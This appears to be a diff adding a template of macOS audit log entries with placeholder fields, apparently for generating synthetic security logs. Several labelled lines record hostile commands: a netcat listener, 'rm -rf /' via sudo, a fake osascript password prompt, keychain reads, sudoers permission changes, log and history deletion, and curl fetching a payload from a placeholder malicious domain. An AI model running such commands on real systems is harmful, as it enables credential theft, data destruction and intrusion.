@@ -1,0 +1,48 @@
+event=AUE_EXECVE timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path={process_path} args="{command_line_args}" status=success return=0
+event=AUE_OPEN_RWTC timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="{file_path}" flags=O_RDWR|O_TRUNC|O_CREAT mode=0644 status=success return=0 fd={fd}
+event=AUE_UNLINK timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="{file_path}" status=success return=0 dirpath="{dir_path}"
+event=AUE_CHMOD timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="{file_path}" new_mode=0777 status=success return=0
+event=AUE_CHOWN timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="{file_path}" new_uid={new_uid} new_gid={new_gid} status=success return=0
+event=AUE_SYSTEM_ACCOUNT timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} message="Failed login for user '{failed_user}'" host={hostname} status=failure return=Authentication error reason="invalid password" service=authorizationhost terminal={tty}
+event=AUE_SYSTEM_LOGIN timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} message="User '{user}' logged in" host={hostname} status=success return=0 service=loginwindow terminal={tty}
+event=AUE_SYSTEM_LOGOUT timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} message="User '{user}' logged out" host={hostname} status=success return=0 service=loginwindow terminal={tty}
+event=AUE_CONNECT timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} process={process_name} src_ip={src_ip} src_port={src_port} dst_ip={dst_ip} dst_port={dst_port} proto=tcp status=success return=0 socket={socket_fd}
+event=AUE_SUDO timestamp={timestamp} user={user} uid={uid} euid=0 pid={pid} command="{command_executed}" status=success return=0 host={hostname} tty={tty} target_user=root cwd="{cwd}"
+event=AUE_EXECVE timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path=/usr/bin/nc args="-l -p {listen_port}" status=success return=0 cwd="{cwd}" # Netcat listener
+event=AUE_OPEN_WTC timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="{system_config_file}" flags=O_WRONLY|O_TRUNC|O_CREAT mode=0600 status=success return=0 fd={fd} # Write to system config
+event=AUE_UNLINK timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="{log_file_path}" status=success return=0 dirpath="/var/log/" # Log deletion
+event=AUE_CHMOD timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path=/etc/sudoers new_mode=0666 status=success return=0 # Insecure permissions
+event=AUE_CHOWN timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path=/usr/local/bin/{script_name} new_uid=0 new_gid=0 status=success return=0 # Change ownership to root
+event=AUE_SYSTEM_ACCOUNT timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} message="Failed login attempts limit reached for user '{failed_user}'" host={hostname} status=failure return=Account locked reason="too many failures" service=sshd terminal={tty} src_ip={src_ip}
+event=AUE_SYSTEM_REBOOT timestamp={timestamp} user={user} uid={uid} euid=0 pid={pid} message="System reboot initiated by {user}" host={hostname} status=success return=0
+event=AUE_ACCEPT timestamp={timestamp} user=root uid=0 euid=0 pid={pid} process=/usr/sbin/sshd listen_addr=0.0.0.0 listen_port=22 client_addr={src_ip} client_port={src_port} proto=tcp status=success return=0 socket={socket_fd}
+event=AUE_BIND timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} process={process_name} addr=0.0.0.0 port={listen_port} proto=udp status=success return=0 socket={socket_fd} # Suspicious UDP bind
+event=AUE_SUDO timestamp={timestamp} user={user} uid={uid} euid={uid} pid={pid} command="/bin/rm -rf /" status=failure return=Operation not permitted host={hostname} tty={tty} target_user=root cwd="{cwd}" # Failed malicious sudo
+event=AUE_EXECVE timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path=/usr/bin/osascript args="-e 'tell app "System Events" to display dialog "Enter Password" default answer "" with hidden answer'" status=success return=0 # Phishing attempt
+event=AUE_OPEN_RTC timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="~/Library/Application Support/Keychain/login.keychain-db" flags=O_RDONLY status=success return=0 fd={fd} # Keychain access
+event=AUE_UNLINK timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="{quarantine_db_path}" status=success return=0 dirpath="/var/db/" # Tampering with quarantine data
+event=AUE_CHMOD timestamp={timestamp} user=root uid=0 euid=0 pid={pid} path=/private/var/log/audit/current new_mode=0000 status=success return=0 # Attempt to disable auditing
+event=AUE_CHOWN timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="{file_path}" new_uid={attacker_uid} new_gid={attacker_gid} status=success return=0 # Change ownership to attacker
+event=AUE_SYSTEM_ACCOUNT timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} message="User '{new_user}' created" host={hostname} status=success return=0 service=opendirectoryd
+event=AUE_MOUNT timestamp={timestamp} user={user} uid={uid} euid=0 pid={pid} filesystem={filesystem_type} path="{mount_point}" device="{device_path}" flags={mount_flags} status=success return=0 # Mounting external device
+event=AUE_SOCKET timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} domain=AF_INET type=SOCK_STREAM proto=tcp status=success return=0 fd={socket_fd}
+event=AUE_IOCTL timestamp={timestamp} user=root uid=0 euid=0 pid={pid} device="{device_path}" command=DKIOCSETKEY flags={ioctl_flags} status=success return=0 # Filesystem encryption related ioctl
+event=AUE_KLOAD timestamp={timestamp} user=root uid=0 euid=0 pid={pid} path="{kernel_extension_path}" status=success return=0 # Kernel extension loaded
+event=AUE_EXECVE timestamp={timestamp} user={user} uid={uid} euid=0 pid={pid} path=/sbin/kextload args="{kernel_extension_path}" status=success return=0 # Kextload execution
+event=AUE_OPEN_WTC timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="{user_home}/.ssh/authorized_keys" flags=O_WRONLY|O_APPEND|O_CREAT mode=0600 status=success return=0 fd={fd} # Modifying authorized_keys
+event=AUE_UNLINK timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path="{user_home}/.bash_history" status=success return=0 dirpath="{user_home}" # Clearing bash history
+event=AUE_CHFLAGS timestamp={timestamp} user=root uid=0 euid=0 pid={pid} path="{system_critical_file}" new_flags=UF_IMMUTABLE status=success return=0 # Making file immutable (defense or attack prep)
+event=AUE_SETUID timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} new_uid=0 status=success return=0 process={process_name} # Process elevated to root
+event=AUE_SETEUID timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} new_euid=0 status=success return=0 process={process_name} # Process effective UID changed to root
+event=AUE_SYSTEM_ACCOUNT timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} message="Password changed for user '{target_user}'" host={hostname} status=success return=0 service=passwd by_user={admin_user}
+event=AUE_SENDTO timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} process={process_name} src_ip={src_ip} src_port={src_port} dst_ip={dst_ip} dst_port=53 proto=udp status=success return={bytes_sent} socket={socket_fd} # DNS query (potential C2)
+event=AUE_RECVFROM timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} process={process_name} src_ip={src_ip} src_port=53 dst_ip={dst_ip} dst_port={dst_port} proto=udp status=success return={bytes_rcvd} socket={socket_fd} # DNS response
+event=AUE_SUDO timestamp={timestamp} user={user} uid={uid} euid={uid} pid={pid} command="launchctl load /Library/LaunchDaemons/{malware_plist}.plist" status=success return=0 host={hostname} tty={tty} target_user=root cwd="{cwd}" # Loading persistent malware
+event=AUE_EXECVE timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} path=/usr/bin/curl args="-o /tmp/{malware_file} http://{malicious_domain}/payload" status=success return=0 # Downloading payload
+event=AUE_OPEN_WTC timestamp={timestamp} user=root uid=0 euid=0 pid={pid} path=/etc/hosts flags=O_WRONLY|O_APPEND mode=0644 status=success return=0 fd={fd} # Modifying hosts file (pharming/C2)
+event=AUE_LINK timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} old_path="{original_file}" new_path="{link_name}" status=success return=0 # Creating hard/symbolic link
+event=AUE_EXIT timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} process={process_name} status=killed signal=SIGKILL return=9 # Process killed
+event=AUE_FORK timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} child_pid={child_pid} status=success return=0 # Process forked
+event=AUE_SETSOCKOPT timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} socket={socket_fd} level=SOL_SOCKET option=SO_REUSEADDR value=1 status=success return=0 # Socket option modified
+event=AUE_SYSTEM_SHUTDOWN timestamp={timestamp} user={user} uid={uid} euid=0 pid={pid} message="System shutdown initiated by {user}" host={hostname} status=success return=0
+event=AUE_MACF timestamp={timestamp} user={user} uid={uid} euid={euid} pid={pid} policy="MAC Framework Policy" object="{object_name}" subject="{subject_name}" action="denied" reason="{macf_reason}" status=failure return=EPERM # Mandatory Access Control denial
